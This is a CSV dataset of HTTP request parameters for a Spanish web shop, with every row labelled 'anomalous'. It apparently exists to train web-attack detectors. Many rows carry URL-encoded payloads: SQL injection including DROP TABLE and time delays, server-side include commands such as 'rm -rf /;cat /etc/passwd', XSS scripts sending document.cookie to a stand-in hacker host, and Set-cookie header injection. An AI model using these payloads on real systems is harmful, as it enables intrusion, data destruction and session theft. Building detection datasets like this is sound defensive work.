text,method,label
modo=insertar&precio=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja,GET,anomalous
modoA=insertar&precio=5756&B1=Pasar+por+caja,GET,anomalous
modo=registro&login=alane&password=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra&cp=09129&provincia=Girona&ntc=1134011255413195&B1=Registrar,PUT,anomalous
modo=registro&login=alane&password=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra%27OR%27a%3D%27a&cp=09129&provincia=Girona&ntc=1134011255413195&B1=Registrar,GET,anomalous
modo=registro&login=alane&password=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra&cp=09129&provincia=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&ntc=1134011255413195&B1=Registrar,GET,anomalous
modo=registro&login=alane&passwordA=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra&cp=09129&provincia=Girona&ntc=1134011255413195&B1=Registrar,GET,anomalous
B2=Vaciar+carrito%27+AND+%271%27%3D%271,GET,anomalous
B2=%22+AND+%221%22%3D%221,GET,anomalous
modo=registro&login=ning&password=Graciosamente&nombre=Roc%EDo+Libertad&apellidos=Oviol+De+la+Quintana&email=tchoukova%40sgi-sl.is&dni=16822336K&direccion=Urbanizacion+Palmeras%2C+S%2FN%2C+&ciudad=Mo%2Bntgai&cp=17723&provincia=Segovia&ntc=1507392936285379&B1=Registrar,GET,anomalous
modoA=registro&login=ning&password=Graciosamente&nombre=Roc%EDo+Libertad&apellidos=Oviol+De+la+Quintana&email=tchoukova%40sgi-sl.is&dni=16822336K&direccion=Urbanizacion+Palmeras%2C+S%2FN%2C+&ciudad=Oropesa&cp=17723&provincia=Segovia&ntc=1507392936285379&B1=Registrar,GET,anomalous
id=3&nombre=Vino+Rioja&precio=100&cantidad=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Vino+Rioja&precioA=100&cantidad=4&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=balwinde&pwd=nac%E1reo&remember=off&B1=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,GET,anomalous
modo=entrar&login=balwinde&pwd=p%2714pa514%2Fi1%2Fo&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=balwinde&pwd=nac%E1reo&remember=off&B1A=Entrar,GET,anomalous
modo=insertar&precio=1633&B1=Confirmar%27INJECTED_PARAM,GET,anomalous
modo=insertar&precio=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Confirmar,GET,anomalous
modo=insertar&precio=1633&B1=Confirmar%2F,GET,anomalous
modo=insertar&precioA=1633&B1=Confirmar,GET,anomalous
modo=registro&login=teed&password=6_u1l67ador&nombre=Omer&apellidos=Quirentes+Vallori&email=portet.olteanu%40pintandomucho.tv&dni=37698964D&direccion=C%2F+Isidro+Polo%2C+0+13%3FC&ciudad=Utrillas&cp=02310&provincia=Barcelona&ntc=4326433486745952&B1=Registrar,PUT,anomalous
modo=registro&login=teed&password=6_u1l67ador&nombre=Omer&apellidos=Quirentes+Vallori&email=portet.olteanu%40pintandomucho.tv&dni=37698964D&direccion=C%2F+Isidro+Polo%2C+0+13%3FC&ciudad=Utrillas&cp=02310&provincia=%2520&ntc=4326433486745952&B1=Registrar,GET,anomalous
modo=registro&login=teed&password=6_u1l67ador&nombre=Omer&apellidos=Quirentes+Vallori&email=portet.olteanu%40pintandomucho.tv&dni=7A%279417AM&direccion=C%2F+Isidro+Polo%2C+0+13%3FC&ciudad=Utrillas&cp=02310&provincia=Barcelona&ntc=4326433486745952&B1=Registrar,GET,anomalous
modo=registro&login=teed&passwordA=6_u1l67ador&nombre=Omer&apellidos=Quirentes+Vallori&email=portet.olteanu%40pintandomucho.tv&dni=37698964D&direccion=C%2F+Isidro+Polo%2C+0+13%3FC&ciudad=Utrillas&cp=02310&provincia=Barcelona&ntc=4326433486745952&B1=Registrar,GET,anomalous
B2=Vaciar+carrito%253F,GET,anomalous
modo=registro&login=jesshope&password=bisaRma&nombre=Tr%E1nsito&apellidos=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&email=spalinger%40perrosmodelo.aw&dni=76108310E&direccion=C%2F+Algodonales%2C+129+&ciudad=Bele%F1a&cp=26312&provincia=Girona&ntc=4326433486745952&B1=Registrar,GET,anomalous
modo=registro&login=jesshope&password=bisaRma&nombre=Tr%E1nsito&apellidos=De+Luca+Alcob%E9&email=spalinger%40perrosmodelo.aw&dni=76108310E&direccion=C%2F+Algodonales%2C+129+&ciudad=Bele%F1a&cp=26312&provincia=Girona&ntc=983921355976591&B1=Registrar,GET,anomalous
modo=registro&login=jesshope&password=bisaRma&nombre=Tr%E1nsito&apellidos=De+Luca+Alcob%E9&email=spalinger%40perrosmodelo.aw&dni=76108310E&direccion=C%2F+Algodonales%2C+129+&ciudad=Bele%F1a&cp=26312&provincia=Girona&ntcA=4326433486745952&B1=Registrar,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=%27INJECTED_PARAM&cantidad=90&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=90&B1=A%F1adir+al+carrito,GET,anomalous
idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=90&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar%4040&login=kube9&pwd=38r20NvE1e9&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=kube9&pwd=38r20NvE1e9&remember=on&B1=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,GET,anomalous
modo=entrar&login=kube9&pwd=38r20NvE1e9&remember=on%2F&B1=Entrar,GET,anomalous
modo=entrar&loginA=kube9&pwd=38r20NvE1e9&remember=on&B1=Entrar,GET,anomalous
id=1%257C,GET,anomalous
errorMsg=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,GET,anomalous
modo=insertar&precio=342&B1=Confirmar%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,GET,anomalous
modo=insertar&precio=342&B1A=Confirmar,GET,anomalous
modo=registro&login=ploof&password=p04u803&nombre=Alenda&apellidos=Pruneda+De+Velasco&email=%252B&dni=50020791T&direccion=Carretera+Lebrija%2C+25+&ciudad=Santo+Tom%E9+del+Puerto&cp=42126&provincia=C%E1ceres&ntc=7582936564650481&B1=Registrar,GET,anomalous
modo=registro&login=ploof&password=p04u803&nombre=Alenda&apellidos=Pruneda+De+Velasco&email=caron%40nexuspark.ai&dni=85853074BP&direccion=Carretera+Lebrija%2C+25+&ciudad=Santo+Tom%E9+del+Puerto&cp=42126&provincia=C%E1ceres&ntc=7582936564650481&B1=Registrar,GET,anomalous
modo=registro&login=ploof&password=p04u803&nombre=Alenda&apellidos=Pruneda+De+Velasco&email=caron%40nexuspark.ai&dni=50020791T&direccion=Carretera+Lebrija%2C+25+&ciudad=Santo+Tom%E9+del+Puerto&cp=42126&provincia=C%E1ceres&ntc=7582936564650481&B1A=Registrar,GET,anomalous
modo=registro&login=lyn&password=foll0dor&nombre=Lupo&apellidos=Palabichini+Sanabria&email=pitti%40tuslimites.sr&dni=84779%27191&direccion=C%2F+Ibarra%2C+152+5%3FD&ciudad=Vilalba+dels+Arcs&cp=09280&provincia=Zamora&ntc=5442634802998602&B1=Registrar,GET,anomalous
modo=registro&login=lyn&password=foll0dor&nombre=Lupo&apellidos=Palabichini+Sanabria&email=pitti%40tuslimites.sr&dni=72999469E&direccion=C%2F+Ibarra%2C+152+5%3FD&ciudad=Vilalba+dels+Arcs&cp=09280&provinciaA=Zamora&ntc=5442634802998602&B1=Registrar,GET,anomalous
id=1%2F&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=19&B1=A%F1adir+al+carrito,GET,anomalous
idA=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=19&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=sinha1&pwd=c%E1LCIca&remember=off&B1=Entrar,PUT,anomalous
modo=entrar&login=sinha1&pwd=c%E1LCIca&remember=%253F&B1=Entrar,GET,anomalous
modo=entrar&login=sinha1&pwd=c%E1LCIca&remember=on%2F&B1=Entrar,GET,anomalous
id=1%4040,GET,anomalous
errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,GET,anomalous
modo=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&precio=7285&B1=Confirmar,GET,anomalous
modo=insertar&precio=7285&B1=Confirmar%2F,GET,anomalous
modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=Rasmiraany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&apellidos=Pavi%E9+Pool&email=gloves%40sms24h.mk&dni=92795576Y&direccion=Calle+Jose+Luis+De+Arrese%2C+105+1%3FF&ciudad=Ger&cp=24370&provincia=Cantabria&ntc=7563981891605435&B1=Registrar,GET,anomalous
modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=Rasmira&apellidos=Pavi%E9+Pool&email=gloves%40sms24h.mk&dni=92795576Y&direccion=Calle+Jose+Luis+De+Arrese%2C+105+1%3FF&ciudad=Ger&cp=24370&provincia=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=7563981891605435&B1=Registrar,GET,anomalous
modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=Rasmira&apellidos=Pavi%E9+Pool&email=gloves%40sms24h.mk&dni=92795576Y&direccion=C%2F+Venus%2C%2B+60%2C+&ciudad=Ger&cp=24370&provincia=Cantabria&ntc=7563981891605435&B1=Registrar,GET,anomalous
modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=Rasmira&apellidos=Pavi%E9+Pool&email=gloves%40sms24h.mk&dni=92795576Y&direccion=Calle+Jose+Luis+De+Arrese%2C+105+1%3FF&ciudad=Ger&cp=24370&provincia=Cantabria&ntcA=7563981891605435&B1=Registrar,GET,anomalous
B2=%3F,GET,anomalous
modo=registro&login=gi%2F%3Fl&password=EnTe%2B6A7&nombre=Serveriana&apellidos=Santander+Bohorquez&email=rundle4%40eurograb.ma&dni=09116322L&direccion=Calle+Trebedes+157%2C+&ciudad=Fasnia&cp=02270&provincia=Ciudad+Real&ntc=1078977887269273&B1=Registrar,GET,anomalous
modoA=registro&login=puglia&password=EnTe%2B6A7&nombre=Serveriana&apellidos=Santander+Bohorquez&email=rundle4%40eurograb.ma&dni=09116322L&direccion=Calle+Trebedes+157%2C+&ciudad=Fasnia&cp=02270&provincia=Ciudad+Real&ntc=1078977887269273&B1=Registrar,GET,anomalous
id=3&nombre=Vino+Rioja&precio=39&cantidad=4&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,GET,anomalous
id=3&nombre=Vino+Rioja&precio=100%2F&cantidad=4&B1=A%F1adir+al+carrito,GET,anomalous
idA=3&nombre=Vino+Rioja&precio=39&cantidad=4&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=t%2B%27hain%3Fe&pwd=Sur%3FTidO&remember=on&B1=Entrar,GET,anomalous
modoA=entrar&login=simon-ch&pwd=Sur%3FTidO&remember=on&B1=Entrar,GET,anomalous
id=2%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,GET,anomalous
errorMsg=Credenciales+incorrectas%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,GET,anomalous
modo=insertar&precio=2231&B1=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,GET,anomalous
modo=insertar&precio=2231&B1=Confirmar%2F,GET,anomalous
modo=insertar&precio=2231&B1A=Confirmar,GET,anomalous
modo=registro&login=diahann&password=mARcel_iNo&nombre=Asad&apellidos=Tonato+Valle&email=grizzard%40ytv.com.mv&dni=75976186X&direccion=C%2F+Juan+De+Lara+115%2C+9%3FA&ciudad=Mazcuerras%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=43393&provincia=Valencia&ntc=8430846550683709&B1=Registrar,GET,anomalous
modo=registro&login=diahann&password=mARcel_iNo&nombre=Asad&apellidos=Tonato+Valle&email=grizzard%40ytv.com.mv&dni=%27+AND+%271%27%3D%271&direccion=C%2F+Juan+De+Lara+115%2C+9%3FA&ciudad=Mazcuerras&cp=43393&provincia=Valencia&ntc=8430846550683709&B1=Registrar,GET,anomalous
modo=registro&login=diahann&password=%2Fp%2Faral&nombre=Asad&apellidos=Tonato+Valle&email=grizzard%40ytv.com.mv&dni=75976186X&direccion=C%2F+Juan+De+Lara+115%2C+9%3FA&ciudad=Mazcuerras&cp=43393&provincia=Valencia&ntc=8430846550683709&B1=Registrar,GET,anomalous
modo=registro&login=diahann&password=mARcel_iNo&nombre=Asad&apellidos=Tonato+Valle&email=grizzard%40ytv.com.mv&dni=75976186X&direccion=C%2F+Juan+De+Lara+115%2C+9%3FA&ciudad=Mazcuerras&cp=43393&provinciaA=Valencia&ntc=8430846550683709&B1=Registrar,GET,anomalous
B2=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,GET,anomalous
modo=registro&login=thuy&password=vafoSa&nombre=Tosca&apellidos=Pica%F1ol+Pedreira&email=%40cr%40anh%40am%404horas.ki&dni=80624196L&direccion=Igualada%2C+157+&ciudad=Breda&cp=08348&provincia=Segovia&ntc=2333713014492030&B1=Registrar,GET,anomalous
modo=registro&login=thuy&password=vafoSa&nombre=Tosca&apellidosA=Pica%F1ol+Pedreira&email=markowski%40salaparis.pe&dni=80624196L&direccion=Igualada%2C+157+&ciudad=Breda&cp=08348&provincia=Segovia&ntc=2333713014492030&B1=Registrar,GET,anomalous
id=2%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=73&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Ques%2Bo+Manchego&precio=85&cantidad=73&B1=A%F1adir+al+carrito,GET,anomalous
idA=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=73&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=leppert&pwd=6albu-ce9r&remember=on&B1=Entrar,PUT,anomalous
modo=entrar&login=leppert&pwd=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=leppert&pwd=6albu-ce9r&remember=off%2F&B1=Entrar,GET,anomalous
modo=entrar&login=leppert&pwd=6albu-ce9r&remember=on&B1A=Entrar,GET,anomalous
modo=insertar&precio=7092&B1=Confirmarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,GET,anomalous
modo=insertar&precio=7092&B1=Confirmar%2F,GET,anomalous
modo=registro&login=ehab&password=pio58241&nombre=Vanina&apellidos=Metauten+Suau&email=eiler-philpelli%40cpanelweb.com.af&dni=82384047W&direccion=San+Jose+139%2C+13E&ciudad=Plasenzuela&cp=45200&provincia=Salamanca&ntc=6014129235774839&B1=Registrarany%250ASet-cookie%253A%2BTamper%253D1041264011025374727,GET,anomalous
modo=registro&login=ehab&password=pio58241&nombre=Rimo%27n&apellidos=Metauten+Suau&email=eiler-philpelli%40cpanelweb.com.af&dni=82384047W&direccion=San+Jose+139%2C+13E&ciudad=Plasenzuela&cp=45200&provincia=Salamanca&ntc=6014129235774839&B1=Registrar,GET,anomalous
modo=registro&login=ehab&password=pio58241&nombre=Vanina&apellidos=Metauten+Suau&email=eiler-philpelli%40cpanelweb.com.af&dni=82384047W&direccion=San+Jose+139%2C+13E&ciudad=Plasenzuela&cp=45200&provinciaA=Salamanca&ntc=6014129235774839&B1=Registrar,GET,anomalous
B2=%257C,GET,anomalous
modo=registro&login=quan&password=L71o7O6%CDNe4&nombre=Herm%E1nn&apellidos=Estaragu%E9+Cort%E9s&email=girls%40viscotek.mh&dni=62336583M&direccion=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&ciudad=Aras&cp=37727&provincia=Granada&ntc=3043074301340407&B1=Registrar,GET,anomalous
modo=registro&login=quan&password=L71o7O6%CDNe4&nombre=Herm%E1nn&apellidos=Estaragu%E9+Cort%E9s&email=girls%40viscotek.mh&dni=62336583M&direccion=Murill*o%2C+S%2F*N%2C+3%2B%3FG&ciudad=Aras&cp=37727&provincia=Granada&ntc=3043074301340407&B1=Registrar,GET,anomalous
modo=registro&login=quan&password=L71o7O6%CDNe4&nombreA=Herm%E1nn&apellidos=Estaragu%E9+Cort%E9s&email=girls%40viscotek.mh&dni=62336583M&direccion=Nucleo+Condes+De+La+Rochelambert%2C+7+&ciudad=Aras&cp=37727&provincia=Granada&ntc=3043074301340407&B1=Registrar,GET,anomalous
id=1&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=36&B1=A%F1adir+al+carrito,GET,anomalous
idA=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=36&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=ernie5&pwd=mu%21stIA&remember=off&B1=Entrar,PUT,anomalous
modo=entrar&login=ernie5&pwd=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=balak*%3Fris&pwd=mu%21stIA&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=ernie5&pwdA=mu%21stIA&remember=off&B1=Entrar,GET,anomalous
modo=insertar&precio=1136&B1=%22+AND+%221%22%3D%221,GET,anomalous
modo=insertar&precio=1136&B1=Confirmar%2F,GET,anomalous
modo=insertar&precioA=1136&B1=Pasar+por+caja,GET,anomalous
modo=registro&login=radick&password=T76F6li6&nombre=Tercero&apellidos=Muleiro&email=roope%40gesmahernan.kn&dni=54463358W&direccion=Ronda+Cervantes+146%2C+13%3FG&ciudad=Ucl*.%E9s&cp=12225&provincia=Albacete&ntc=2464400659124948&B1=Registrar,GET,anomalous
modo=registro&loginA=radick&password=T76F6li6&nombre=Tercero&apellidos=Muleiro&email=roope%40gesmahernan.kn&dni=54463358W&direccion=Ronda+Cervantes+146%2C+13%3FG&ciudad=Navacarros&cp=12225&provincia=Albacete&ntc=2464400659124948&B1=Registrar,GET,anomalous
modo=registro&login=tetsuo&password=a%24cu%E1til&nombre=Janina&apellidos=Corado+Bon%EDas&email=bienvenu-goz%40carmensanmartin.lv&dni=48475570B&direccion=Especias%2C+58%2C+12C&ciudad=Valdeavellano&cp=4054A&provincia=Toledo&ntc=8452706434058820&B1=Registrar,GET,anomalous
modo=registro&login=tetsuo&password=a%24cu%E1til&nombre=Janina&apellidos=Corado+Bon%EDas&email=bienvenu-goz%40carmensanmartin.lv&dni=48475570B&direccion=Especias%2C+58%2C+12C&ciudad=Valdeavellano&cp=09560&provincia=Toledo&ntc=8452706434058820&B1A=Registrar,GET,anomalous
id=2&nombre=Ques%2Bo+Manchego&precio=85&cantidad=54&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=puglia&pwd=abunDanTEMeNte&remember=on%253F&B1=Entrar,GET,anomalous
modo=entrar&login=AND+1%3D1&pwd=abunDanTEMeNte&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=puglia&pwd=abunDanTEMeNte&remember=on%2F&B1=Entrar,GET,anomalous
modo=entrar&login=puglia&pwd=abunDanTEMeNte&rememberA=on&B1=Entrar,GET,anomalous
id=%22+AND+%221%22%3D%221,GET,anomalous
modo=insertar%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=8588&B1=Confirmar,GET,anomalous
modo=insertar&precio=8588&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,GET,anomalous
modo=insertar&precio=8588&B1=Confirmar%2F,GET,anomalous
modo=%2520&login=cash3&password=urpila&nombre=Jeanne&apellidos=Sandrini+Rotllant&email=olmer%40matchball.com.im&dni=52809393J&direccion=Pla%E7a+De+Can+Galta+Cremat%2C+111+&ciudad=Navia&cp=37447&provincia=C%E1diz&ntc=1124103686450000&B1=Registrar,GET,anomalous
modo=registro&login=cash3&password=urpila&nombre=Jeanne&apellidos=Sandrini+Rotllant&email=olmer%40matchball.com.im&dni=52809393J&direccion=Pla%E7a+De+Can+Galta+Cremat%2C+111+&ciudad=Navia&cp=37447&provincia=Gir%3Fon%3Fa&ntc=1124103686450000&B1=Registrar,GET,anomalous
modo=registro&login=cash3&password=urpila&nombre=Jeanne&apellidosA=Sandrini+Rotllant&email=olmer%40matchball.com.im&dni=52809393J&direccion=Pla%E7a+De+Can+Galta+Cremat%2C+111+&ciudad=Navia&cp=37447&provincia=C%E1diz&ntc=1124103686450000&B1=Registrar,GET,anomalous
modo=registro&login=fayette&password=erECta&nombre=Katerina&apellidos=Moyano+Hasb%FAn&email=rosley-flakenstein%40alquivira.af&dni=91432847G&direccion=Napols+128%2C+4C&ciudad=Quintana+de+la+Serena&cp=18360&provincia=Ourense&ntc=6775628411457968paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Registrar,GET,anomalous
id=1&nombre=Vino+Rioja&precio=85&cantidad=98&B1=A%F1adir+al+carrito,PUT,anomalous
id=1&nombre=Vino+Rioja&precio=85%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&cantidad=98&B1=A%F1adir+al+carrito,GET,anomalous
id=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&nombre=Vino+Rioja&precio=85&cantidad=98&B1=A%F1adir+al+carrito,GET,anomalous
id=1&nombreA=Vino+Rioja&precio=85&cantidad=98&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=drusie&pwd=cAreRa%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=drusie&pwd=cAreRa&remember=on&B1=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,GET,anomalous
modo=entrar&login=drusie&pwd=cAreRa&remember=on%2F&B1=Entrar,GET,anomalous
modo=entrar&loginA=drusie&pwd=cAreRa&remember=on&B1=Entrar,GET,anomalous
id=%4040,GET,anomalous
modo=insertar&precio=8022&B1=Confirmar%2F,GET,anomalous
modoA=insertar&precio=8022&B1=Pasar+por+caja,GET,anomalous
modo=registro&login=schoen&password=cartear&nombre=Zaima&apellidos=Falgeras+Puerta&email=hargitay%40corjet.coop&dni=33685330J&direccion=Calle+Pedro+Salinas%2C+15%2C+6%3FH%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&ciudad=Bierge&cp=44155&provincia=C%E1ceres&ntc=2909791700288840&B1=Registrar,GET,anomalous
modo=registro&login=%2500&password=cartear&nombre=Zaima&apellidos=Falgeras+Puerta&email=hargitay%40corjet.coop&dni=33685330J&direccion=Calle+Pedro+Salinas%2C+15%2C+6%3FH&ciudad=Bierge&cp=44155&provincia=C%E1ceres&ntc=2909791700288840&B1=Registrar,GET,anomalous
modo=registro&login=schoen&password=cartear&nombre=Zaima&apellidos=Falgeras+Puerta&email=hargitay%40corjet.coop&dni=33685330J&direccion=Calle+Pedro+Salinas%2C+15%2C+6%3FH&ciudad=Bierge&cp=4377A&provincia=C%E1ceres&ntc=2909791700288840&B1=Registrar,GET,anomalous
modoA=registro&login=schoen&password=cartear&nombre=Zaima&apellidos=Falgeras+Puerta&email=hargitay%40corjet.coop&dni=33685330J&direccion=Calle+Pedro+Salinas%2C+15%2C+6%3FH&ciudad=Bierge&cp=44155&provincia=C%E1ceres&ntc=2909791700288840&B1=Registrar,GET,anomalous
B2=Vaciar+carrito%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,GET,anomalous
modo=registro&login=earlene&password=SInT%E9TIcA&nombre=Deodato&apellidos=Chen+Bali%F1a&email=chalon%40ingenelec.gl&dni=00776957V&direccion=Calle+La+Ba%F1eza+52+&ciudad=Remolinos&cp=18570&provincia=Castell%F3n&ntc=7967285688712382&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,GET,anomalous
